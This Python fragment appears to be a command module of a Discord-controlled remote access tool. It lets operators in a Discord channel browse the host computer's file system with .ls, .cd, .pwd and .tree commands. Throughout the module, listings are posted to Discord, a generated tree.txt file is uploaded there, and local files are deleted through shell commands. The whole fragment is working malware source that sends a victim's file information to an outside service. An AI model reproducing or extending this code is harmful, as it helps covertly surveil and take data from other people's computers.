from itertools import islice
from resources.misc import *
from pathlib import Path
import subprocess
import sys
import os
# end of imports
# on reaction add
elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
    #.log Reaction is "remove tree messages" 
    for i in tree_messages:
        try:
            await i.delete()
            #.log Deleted a tree message 
        except:
            pass
    tree_messages = []
    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
    #.log Removed tree.txt 
elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
    #.log Reaction is "download tree" 
    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
    #.log Sent tree.txt 
    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
    #.log Removed tree.txt 
# on message
elif message.content == '.clear':
    #.log Message is "clear" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        async for message in client.get_channel(channel_ids['file']).history():
            await message.delete()
            #.log Removed a message 
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
elif message.content == '.tree':
    #.log Message is "tree" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        tree_messages = []
        tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
        dir_path = Path('/'.join(working_directory))
        tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
        #.log Sent first message of tree 
        with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
            system_tree.write(str(dir_path) + '\n')
            #.log Created tree.txt 
        length_limit = sys.maxsize
        iterator = tree(Path('/'.join(working_directory)))
        #.log Got tree 
        tree_message_content = '```^\n'
        for line in islice(iterator, length_limit):
            with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                system_tree.write(line + '\n')
                #.log Written tree into tree.txt 
            if len(tree_message_content) > 1800:
                tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                #.log Sent tree 
                tree_message_content = '```'
            else:
                tree_message_content += str(line) + '\n'
                #.log Sent tree 
        if tree_message_content != '```':
            tree_messages.append(await message.channel.send(tree_message_content + '```'))
            #.log Sent tree 
        reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
        #.log Sent message about end of tree 
        await reaction_msg.add_reaction('📥')
        #.log Reacted with "download tree" 
        await reaction_msg.add_reaction('🔴')
        #.log Reacted with "remove tree messages" 
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
elif message.content[:3] == '.cd':
    #.log Message is "cd" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        if message.content.strip() == '.cd':
            #.log Author issued empty .cd 
            reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
            #.log Sent message with usage of .cd 
        else:
            if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                #.log Requested directory exists on this PC 
                if '/' in message.content:
                    #.log Author requested to change directory by more than 1 level 
                    for dir in message.content[4:].split('/'):
                        if dir == '..':
                            working_directory.pop(-1)
                            #.log Moved one directory backwards 
                        else:
                            working_directory.append(dir)
                            #.log Moved one directory forward 
                else:
                    if message.content[4:] == '..':
                        working_directory.pop(-1)
                        #.log Moved one directory backwards 
                    else:
                        working_directory.append(message.content[4:])
                        #.log Moved one directory forward 
                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                #.log Sent message about new working directory 
            else:
                if os.path.isdir(message.content[4:]):
                    #.log Author requested to change working directory to certain path 
                    working_directory.clear()
                    #.log Cleared working directory variable 
                    for dir in message.content[4:].split('/'):
                        working_directory.append(dir)
                        #.log Moved one directory forward 
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about new working directory 
                else:
                    #.log Requested directory does not exist on this PC 
                    reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about missing directory 
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
elif message.content == '.ls':
    #.log Message is "ls" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        dir_content_f, dir_content_d, directory_content = [], [], []
        for element in os.listdir('/'.join(working_directory)+'/'):
            if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
            else: dir_content_d.append(element)
        #.log Fetched the content of working directory 
        dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
        #.log Sorted the listed content of working directory 
        for single_directory in dir_content_d: directory_content.append(single_directory)
        for single_file in dir_content_f: directory_content.append(single_file)
        #.log Built final list of working directory content 
        await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
        #.log Sent header message of working directory list 
        lsoutput = directory_content
        while lsoutput != []:
            if len('\n'.join(lsoutput)) > 1994:
                #.log Working directory content list is too big to send with one message. Dividing it 
                temp = ''
                while len(temp+lsoutput[0])+1 < 1994:
                    temp += lsoutput[0] + '\n'
                    lsoutput.pop(0)
                await message.channel.send('```' + temp + '```')
                #.log Sent a part of working directory content list 
            else:
                await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                #.log Sent working directory content list 
                lsoutput = []
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
elif message.content == '.pwd':
    #.log Message is "pwd" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
        #.log Sent message with current working directory 
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
